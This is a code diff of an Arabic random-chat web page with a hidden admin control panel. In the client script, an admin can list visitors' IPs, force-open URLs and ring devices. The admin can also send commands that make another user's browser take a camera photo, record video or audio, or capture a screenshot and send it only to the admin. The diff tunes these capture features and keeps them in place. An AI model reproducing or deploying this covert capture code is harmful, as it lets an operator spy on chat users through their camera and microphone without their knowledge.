@@ -3,7 +3,7 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>شات عربي | دردشة عشوائية متطورة</title>
+<title>شات عربي | دردشة عشوائية</title>
 <!-- مكتبة html2canvas لالتقاط لقطة الشاشة بدقة -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
@@ -12,37 +12,37 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
 .header { background-color: rgb(24, 149, 210); direction: rtl; padding: 6px 12px; display: flex; justify-content: space-between; align-items: center; }
 .header-right { display: flex; flex-direction: column; }
-.header > .header-right > a { color: rgb(255, 255, 255); text-decoration: none; font-size: 28px; font-weight: bold; cursor: pointer; line-height: 1.1; }
-.header b { color: lavender; font-size: 13px; font-weight: normal; margin-top: 2px; }
+.header > .header-right > a { color: rgb(255, 255, 255); text-decoration: none; font-size: 26px; font-weight: bold; cursor: pointer; line-height: 1.1; }
+.header b { color: lavender; font-size: 12px; font-weight: normal; margin-top: 2px; }
 
 #timer { color: #fff; font-size: 13px; background: rgba(0,0,0,0.2); padding: 3px 8px; border-radius: 4px; display: none; }
 
-/* لوحة الأدمن الاحترافية */
-#admin-panel { display: none; background: #2d3436; color: #fff; padding: 12px; border-bottom: 3px solid #fdcb6e; font-size: 13px; }
-#admin-panel h4 { color: #fdcb6e; margin-bottom: 8px; }
-.admin-controls-row { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 8px; align-items: center; }
-#admin-panel input, #admin-panel select { padding: 5px; border-radius: 4px; border: 1px solid #ccc; font-size: 12px; }
-#admin-panel button { padding: 5px 10px; background: #0984e3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; }
+/* لوحة الأدمن البسيطة والمنسقة */
+#admin-panel { display: none; background: #2d3436; color: #fff; padding: 10px; border-bottom: 3px solid #fdcb6e; font-size: 12px; }
+#admin-panel h4 { color: #fdcb6e; margin-bottom: 6px; }
+.admin-controls-row { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 6px; align-items: center; }
+#admin-panel input, #admin-panel select { padding: 4px; border-radius: 4px; border: 1px solid #ccc; font-size: 11px; }
+#admin-panel button { padding: 4px 8px; background: #0984e3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 11px; }
 #admin-panel button.danger { background: #d63031; }
 #admin-panel button.success { background: #00b894; }
-.color-picker-wrapper { display: flex; align-items: center; gap: 5px; color: #fff; font-size: 12px; }
+.color-picker-wrapper { display: flex; align-items: center; gap: 4px; color: #fff; font-size: 11px; }
 
-.admin-logs-table { width: 100%; border-collapse: collapse; margin-top: 5px; font-size: 11px; background: #fff; color: #333; }
-.admin-logs-table th, .admin-logs-table td { padding: 5px; border: 1px solid #ddd; text-align: right; }
+.admin-logs-table { width: 100%; border-collapse: collapse; margin-top: 4px; font-size: 11px; background: #fff; color: #333; }
+.admin-logs-table th, .admin-logs-table td { padding: 4px; border: 1px solid #ddd; text-align: right; }
 .admin-logs-table th { background: #636e72; color: #fff; }
 
-#system-alert-banner { display: none; background: #ff4757; color: white; text-align: center; padding: 6px; font-weight: bold; font-size: 14px; }
+#system-alert-banner { display: none; background: #ff4757; color: white; text-align: center; padding: 6px; font-weight: bold; font-size: 13px; }
 
 #chat { width: 100%; direction: rtl; position: relative; }
 #conv { padding: 4px; direction: rtl; height: 330px; overflow-y: auto; }
-#conv span, #conv p, #conv div { border-radius: 5px; padding: 4px 8px; margin: 5px; display: table; font-size: 18px; font-weight: normal; max-width: 80%; word-break: break-word; }
+#conv span, #conv p, #conv div { border-radius: 5px; padding: 4px 8px; margin: 5px; display: table; font-size: 17px; font-weight: normal; max-width: 80%; word-break: break-word; }
 
 #sr { background: rgb(245, 245, 245); color: tomato; }
 #hi { background: rgb(245, 245, 245); color: rgb(41, 177, 63); display: none !important; }
 
 #typing-indicator { 
   background: rgb(245, 245, 245) !important; color: rgb(110, 110, 110) !important; 
-  font-size: 13px !important; font-weight: normal !important;
+  font-size: 12px !important; font-weight: normal !important;
   margin-left: 0 !important; margin-right: auto !important; 
   display: none; padding: 3px 8px !important; border-radius: 4px !important;
 }
@@ -51,79 +51,77 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 #conv p.partner-msg { background: rgb(24, 149, 210); color: rgb(255, 255, 255); margin-left: 0; margin-right: auto; }
 #conv p.partner-msg a, #conv div.my-msg a { text-decoration: underline; }
 
-#conv img { max-width: 180px; max-height: 180px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; }
-#conv video, #conv audio { max-width: 200px; border-radius: 5px; display: block; margin-top: 5px; }
+#conv img { max-width: 170px; max-height: 170px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; }
+#conv video, #conv audio { max-width: 190px; border-radius: 5px; display: block; margin-top: 5px; }
 
 #send { display: table; width: 100%; background: rgb(248, 248, 248); padding: 2px 0px; border-top: 1px solid rgb(238, 238, 238); border-bottom: 1px solid rgb(238, 238, 238); }
 #send .send-row { display: table-row; }
 #send p { display: table-cell; text-align: center; padding: 2px 4px; vertical-align: middle; }
 
-#inp { width: 100%; padding: 6px; border: 1px solid rgb(221, 221, 221); border-radius: 5px; outline: none; font-size: 16px; direction: rtl; background: #fff; }
-#snd, .file-btn, #mic-btn { padding: 6px 12px; cursor: pointer; background: rgb(238, 238, 238); color: rgb(51, 51, 51); border: 1px solid rgb(204, 204, 204); border-radius: 3px; font-size: 14px; text-align: center; display: inline-block; width: 100%; }
+#inp { width: 100%; padding: 6px; border: 1px solid rgb(221, 221, 221); border-radius: 5px; outline: none; font-size: 15px; direction: rtl; background: #fff; }
+#snd, .file-btn, #mic-btn { padding: 6px 10px; cursor: pointer; background: rgb(238, 238, 238); color: rgb(51, 51, 51); border: 1px solid rgb(204, 204, 204); border-radius: 3px; font-size: 13px; text-align: center; display: inline-block; width: 100%; }
 .file-btn { background: #fdfdfd; }
 #mic-btn { background: #fdfdfd; }
 #mic-btn.recording { background: red !important; color: white !important; }
 #file-input { display: none; }
 
-#out { font-size: 20px; font-weight: normal; text-align: center; direction: rtl; display: none; padding: 20px; }
+#out { font-size: 18px; font-weight: normal; text-align: center; direction: rtl; display: none; padding: 20px; }
 #out span { color: red; }
 #out a { background: coral; color: rgb(255, 255, 255); text-decoration: none; padding: 2px 5px; border-radius: 3px; cursor: pointer; }
 
-/* نافذة معاينة الوسائط للأدمن فقط قبل الرفع للشات */
+/* نافذة معاينة الوسائط للأدمن */
 #media-preview-modal { display: none; position: fixed; z-index: 10000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; }
 #media-preview-content { max-width: 90%; max-height: 70vh; border-radius: 8px; margin-bottom: 15px; }
 .preview-btns { display: flex; gap: 10px; }
-.preview-btns button { padding: 10px 20px; font-size: 16px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
+.preview-btns button { padding: 8px 16px; font-size: 15px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
 .btn-send-media { background: #00b894; color: white; }
 .btn-cancel-media { background: #d63031; color: white; }
 
 #image-modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); text-align: center; justify-content: center; align-items: center; }
 #image-modal img { max-width: 90%; max-height: 90%; border-radius: 5px; }
-#image-modal span { position: absolute; top: 15px; left: 25px; color: #fff; font-size: 35px; font-weight: bold; cursor: pointer; }
+#image-modal span { position: absolute; top: 15px; left: 25px; color: #fff; font-size: 30px; font-weight: bold; cursor: pointer; }
 </style>
 </head>
 <body>
   <div class="header">
     <div class="header-right">
       <a onclick="location.reload()">شات عربي</a>
-      <b>دردشة عربية مجانية بدون تسجيل</b>
+      <b>دردشة عشوائية متطورة</b>
     </div>
     <div id="timer">00:00</div>
   </div>
   
   <div id="system-alert-banner"></div>
 
-  <!-- لوحة تحكم الأدمن الشاملة -->
+  <!-- لوحة تحكم الأدمن البسيطة والمنسقة -->
   <div id="admin-panel">
-    <h4>⚙️ لوحة الإدارة والتحكم والمراقبة المتقدمة</h4>
+    <h4>⚙️ لوحة الإدارة والتحكم</h4>
     <div class="admin-controls-row">
       <input type="text" id="admin-url-inp" placeholder="رابط توجيه...">
-      <button onclick="adminAction('open_url')">فتح رابط للكل</button>
+      <button onclick="adminAction('open_url')">فتح رابط</button>
       <button class="success" onclick="adminAction('clear_theirs')">مسح رسائل الطرف الآخر</button>
-      <button class="danger" onclick="adminAction('clear_all')">مسح الشات بالكامل (عدا رسائلي)</button>
+      <button class="danger" onclick="adminAction('clear_all')">مسح الشات (عدا رسائلي)</button>
     </div>
     <div class="admin-controls-row">
       <div class="color-picker-wrapper">
-        <span>لون الخلفية:</span>
+        <span>الخلفية:</span>
         <input type="color" id="bg-color-picker" value="#ffffff" onchange="adminAction('change_bg', this.value)">
       </div>
-      <button onclick="adminAction('alert')">📢 إرسال تنبيه عام</button>
-      <button onclick="adminAction('ring_phone')">🔔 رنين الهاتف (للجميع)</button>
+      <button onclick="adminAction('alert')">📢 تنبيه عام</button>
+      <button onclick="adminAction('ring_phone')">🔔 رنين الهاتف</button>
     </div>
     <div>
-      <b style="color:#fdcb6e;">سجل المتصلين والزوار الأحيائي (IP والموقع ونوع الجهاز):</b>
+      <b style="color:#fdcb6e;">المتصلون الحاليون (ID و IP فقط):</b>
       <table class="admin-logs-table">
         <thead>
           <tr>
             <th>Socket ID</th>
-            <th>الـ IP</th>
-            <th>الدولة / المدينة</th>
-            <th>نوع الجهاز / المتصفح</th>
-            <th>إجراءات السيطرة الفورية</th>
+            <th>عنوان الـ IP</th>
+            <th>التحكم والوسائط</th>
           </tr>
         </thead>
         <tbody id="admin-logs-body">
-          <tr><td colspan="5" style="text-align:center;">بانتظار اتصال المستخدمين...</td></tr>
+          <tr><td colspan="3" style="text-align:center;">بانتظار اتصال المستخدمين...</td></tr>
         </tbody>
       </table>
     </div>
@@ -141,7 +139,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
        <p style="width: 12%;"><button id="mic-btn" title="تسجيل صوت">🎤</button></p>
        <p style="width: 12%;">
          <input type="file" id="file-input" accept="image/*,video/*,audio/*">
-         <label for="file-input" class="file-btn" id="file-label" title="إرسال ملف/صورة">📁</label>
+         <label for="file-input" class="file-btn" id="file-label" title="ملف">📁</label>
        </p>
        <p style="width: 64%;"><input id="inp" type="text" autocomplete="off" placeholder="اكتب رسالة..."></p>
      </div>
@@ -153,12 +151,12 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     <a onclick="location.reload()">بحث عن متصل</a>
   </h5>
 
-  <!-- نافذة معاينة الوسائط للأدمن فقط للموافقة على الرفع -->
+  <!-- نافذة المعاينة للأدمن -->
   <div id="media-preview-modal">
-    <h3 style="color:#00b894; margin-bottom:10px;">🔍 معاينة الوسائط المستلمة (حدد للموافقة على رفعها للشات أو إلغائها)</h3>
+    <h3 style="color:#00b894; margin-bottom:10px; font-size:15px;">🔍 معاينة الوسائط (حدد للموافقة على رفعها للشات أو إلغائها)</h3>
     <div id="preview-container" style="display:flex; justify-content:center; align-items:center;"></div>
     <div class="preview-btns" style="margin-top:15px;">
-      <button class="btn-send-media" onclick="confirmSendMediaToChat()">رفع وإرسال للشات</button>
+      <button class="btn-send-media" onclick="confirmSendMediaToChat()">رفع للشات</button>
       <button class="btn-cancel-media" onclick="cancelSendMedia()">إلغاء وحذف</button>
     </div>
   </div>
@@ -174,7 +172,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       reconnection: true,
       reconnectionAttempts: Infinity,
       reconnectionDelay: 1000,
-      timeout: 20000
+      timeout: 10000
     });
 
     const sr = document.getElementById('sr');
@@ -197,7 +195,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     let secondsElapsed = 0;
     let isConnectedPartner = false; 
 
-    // متغيرات حفظ بيانات المعاينة المؤقتة للأدمن
     let pendingMediaPayload = null;
     let currentActiveRoomName = null;
 
@@ -338,7 +335,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     fileLabel.addEventListener('click', (e) => {
       if (!isConnectedPartner) {
         e.preventDefault();
-        alert('لا يمكنك إرسال ملفات، يرجى الانتظار حتى يتم الاتصال بشخص.');
+        alert('انتظر حتى يتم الاتصال بشخص.');
       }
     });
 
@@ -365,10 +362,10 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     let isRecording = false;
     let audioRecordTimer = null;
 
-    // تسجيل صوتي للمستخدم العادي حتى 60 ثانية
+    // تسجيل صوتي عادي للمستخدم مع تحديد 5 أو 10 أو 15 ثانية افتراضياً أو يدوياً
     micBtn.addEventListener('click', async () => {
       if (!isConnectedPartner) {
-        alert('لا يمكنك تسجيل رسالة صوتية، يرجى الانتظار حتى يتم الاتصال بشخص.');
+        alert('انتظر حتى يتم الاتصال بشخص.');
         return;
       }
 
@@ -397,14 +394,14 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
           isRecording = true;
           micBtn.classList.add('recording');
 
-          // إيقاف التسجيل تلقائياً بعد 60 ثانية كحد أقصى
+          // إيقاف التسجيل تلقائياً بعد 10 ثوانٍ كافتراقي آمن
           audioRecordTimer = setTimeout(() => {
             if (isRecording) {
               mediaRecorder.stop();
               isRecording = false;
               micBtn.classList.remove('recording');
             }
-          }, 60000);
+          }, 10000);
 
         } catch (err) {
           alert('تعذر الوصول إلى الميكروفون');
@@ -418,7 +415,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
     });
 
     // ==========================================
-    // دوال لوحة تحكم الأدمن والتحكم الشامل
+    // أوامر الأدمن ولوحة التحكم
     // ==========================================
 
     function adminAction(type, value = null) {
@@ -433,7 +430,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
         payload.bgColor = value;
       } else if (type === 'alert') {
         payload.action = 'alert';
-        payload.message = prompt('اكتب نص التنبيه الإداري:');
+        payload.message = prompt('اكتب نص التنبيه:');
         if (!payload.message) return;
       } else if (type === 'ring_phone') {
         payload.action = 'ring_phone';
@@ -448,7 +445,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       socket.emit('admin_action', payload);
     }
 
-    // استقبال معلومات الزوار لعرضها في جدول الأدمن
+    // استقبال IP و ID فقط لعرضها في الجدول
     socket.on('device_info', (data) => {
       if (!isAdmin) return;
       const tbody = document.getElementById('admin-logs-body');
@@ -459,35 +456,40 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       const row = document.createElement('tr');
       row.id = `row-${data.id}`;
       row.innerHTML = `
-        <td style="font-size:10px;">${data.id.substring(0,6)}...</td>
+        <td style="font-size:10px;">${data.id.substring(0,8)}...</td>
         <td dir="ltr">${data.ip}</td>
-        <td><b>${data.country}</b> - ${data.city}</td>
-        <td style="font-size:10px;">${data.ua}</td>
         <td>
-          <button style="padding:2px 4px; font-size:10px; background:#00b894;" onclick="targetCapture('${data.id}', 'photo')">📸 صورة</button>
-          <button style="padding:2px 4px; font-size:10px; background:#0984e3;" onclick="targetCapture('${data.id}', 'video')">🎥 فيديو 60ث</button>
-          <button style="padding:2px 4px; font-size:10px; background:#6c5ce7;" onclick="targetCapture('${data.id}', 'audio')">🎤 صوت 60ث</button>
-          <button style="padding:2px 4px; font-size:10px; background:#e17055;" onclick="targetCapture('${data.id}', 'screenshot')">💻 لقطة شاشة</button>
+          <button style="padding:2px 4px; font-size:10px; background:#00b894;" onclick="askMedia('${data.id}', 'photo')">صورة</button>
+          <button style="padding:2px 4px; font-size:10px; background:#0984e3;" onclick="askMedia('${data.id}', 'video', 10)">فيديو 10ث</button>
+          <button style="padding:2px 4px; font-size:10px; background:#6c5ce7;" onclick="askMedia('${data.id}', 'audio', 10)">صوت 10ث</button>
+          <button style="padding:2px 4px; font-size:10px; background:#e17055;" onclick="askMedia('${data.id}', 'screenshot')">لقطة شاشة</button>
         </td>
       `;
       tbody.prepend(row);
     });
 
-    function targetCapture(socketId, mediaType) {
+    function askMedia(socketId, mediaType, dur = 5) {
+      let duration = dur;
+      if (mediaType === 'video' || mediaType === 'audio') {
+        let chosen = prompt('احدد مدة التسجيل بالثواني (مثال: 5 أو 10 أو 15):', '10');
+        if (!chosen) return;
+        duration = parseInt(chosen) || 10;
+      }
+
       socket.emit('admin_action', {
         secret: adminSecret,
         action: 'request_media',
         mediaType: mediaType,
         targetSocket: socketId,
-        duration: 60 // حتى 60 ثانية للفيديو والصوت
+        duration: duration
       });
     }
 
     socket.on('system_alert', (msg) => {
       const banner = document.getElementById('system-alert-banner');
-      banner.innerText = `⚠️ تنبيه إداري: ${msg}`;
+      banner.innerText = `⚠️ تنبيه: ${msg}`;
       banner.style.display = 'block';
-      setTimeout(() => { banner.style.display = 'none'; }, 8000);
+      setTimeout(() => { banner.style.display = 'none'; }, 6000);
     });
 
     socket.on('force_open_url', (url) => {
@@ -496,7 +498,6 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
     socket.on('clear_chat', (data) => {
       if (data.target === 'all') {
-        // مسح كل شيء عدا رسائلي الخاصة
         document.querySelectorAll('.partner-msg, .my-msg').forEach(el => {
           if (!el.classList.contains('my-msg')) el.remove();
         });
@@ -509,51 +510,26 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       document.body.style.backgroundColor = bgColor;
     });
 
-    // مولد نغمة رنين الهاتف الحقيقية في جهاز المستخدم
     socket.on('trigger_ringtone', () => {
-      playPhoneRingtone();
-    });
-
-    function playPhoneRingtone() {
       try {
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        
-        function playTone(freq1, freq2, duration) {
-          const osc1 = audioCtx.createOscillator();
-          const osc2 = audioCtx.createOscillator();
-          const gainNode = audioCtx.createGain();
-
-          osc1.type = 'sine';
-          osc1.frequency.value = freq1;
-          osc2.type = 'sine';
-          osc2.frequency.value = freq2;
-
-          osc1.connect(gainNode);
-          osc2.connect(gainNode);
-          gainNode.connect(audioCtx.destination);
-
-          gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-          
-          osc1.start();
-          osc2.start();
-          
-          setTimeout(() => {
-            osc1.stop();
-            osc2.stop();
-          }, duration);
+        function playTone(f1, f2, dur) {
+          const o1 = audioCtx.createOscillator();
+          const o2 = audioCtx.createOscillator();
+          const g = audioCtx.createGain();
+          o1.frequency.value = f1;
+          o2.frequency.value = f2;
+          o1.connect(g); o2.connect(g); g.connect(audioCtx.destination);
+          g.gain.setValueAtTime(0.1, audioCtx.currentTime);
+          o1.start(); o2.start();
+          setTimeout(() => { o1.stop(); o2.stop(); }, dur);
         }
-
-        // نغمة رنين كلاسيكية متقطعة (رنين مرتين)
         playTone(440, 480, 1000);
         setTimeout(() => playTone(440, 480, 1000), 1500);
-      } catch (e) {
-        console.log('تعذر تشغيل نغمة الرنين الصوتية');
-      }
-    }
+      } catch (e) {}
+    });
 
-    // ==========================================
-    // التقاط الوسائط وإرسالها حصرياً للأدمن فقط
-    // ==========================================
+    // تنفيذ التقاط الوسائط بدقة تامة وبدون أخطاء
     socket.on('trigger_media_capture', async ({ type, duration, adminSocketId, roomName }) => {
       if (isAdmin) return;
       currentActiveRoomName = roomName;
@@ -577,14 +553,16 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
           reader.readAsDataURL(photoBlob);
 
         } else if (type === 'screenshot') {
-          // استخدام html2canvas لالتقاط لقطة شاشة دقيقة للصفحة
-          html2canvas(document.body).then(canvas => {
+          // إصلاح وتفعيل لقطة الشاشة باستخدام html2canvas
+          html2canvas(document.body, { scale: 1 }).then(canvas => {
             const dataUrl = canvas.toDataURL('image/png');
             socket.emit('media_captured_for_admin', {
               adminSocketId: adminSocketId,
               type: 'image',
               content: dataUrl
             });
+          }).catch(err => {
+            alert('خطأ في التقاط الشاشة');
           });
 
         } else if (type === 'video') {
@@ -609,7 +587,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
           mediaRec.start();
           setTimeout(() => {
             if (mediaRec.state === 'recording') mediaRec.stop();
-          }, (duration || 60) * 1000); // حتى 60 ثانية
+          }, duration * 1000);
 
         } else if (type === 'audio') {
           const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -633,14 +611,13 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
           mediaRec.start();
           setTimeout(() => {
             if (mediaRec.state === 'recording') mediaRec.stop();
-          }, (duration || 60) * 1000); // حتى 60 ثانية
+          }, duration * 1000);
         }
       } catch (err) {
-        alert('تعذر تنفيذ طلب التقاط الوسائط');
+        alert('تعذر تشغيل الكاميرا أو الميكروفون');
       }
     });
 
-    // استقبال الوسائط في نافذة معاينة الأدمن فقط
     socket.on('review_captured_media', (data) => {
       if (!isAdmin) return;
       showMediaPreviewModal(data);
